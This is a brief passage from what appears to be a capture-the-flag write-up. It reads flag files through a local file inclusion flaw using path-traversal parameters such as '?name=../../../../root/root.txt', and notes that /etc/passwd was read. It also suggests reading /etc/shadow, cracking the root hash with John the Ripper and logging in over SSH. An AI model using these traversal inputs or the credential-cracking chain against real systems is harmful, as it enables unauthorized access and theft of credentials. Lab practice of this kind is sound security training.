We know user "falconfeast" exists after reading the etc/passwd file

User flag: --snip--?name=../../../../home/falconfeast/user.txt
Root flag: --snip--?name=../../../../root/root.txt

* LFI with access to the /root path?
Interesting, we could also cat the content of /etc/shadow get the root SHA512crypt hash and crack it with John the Ripper then log into the server via SSH!

Whichever works best for you :-)
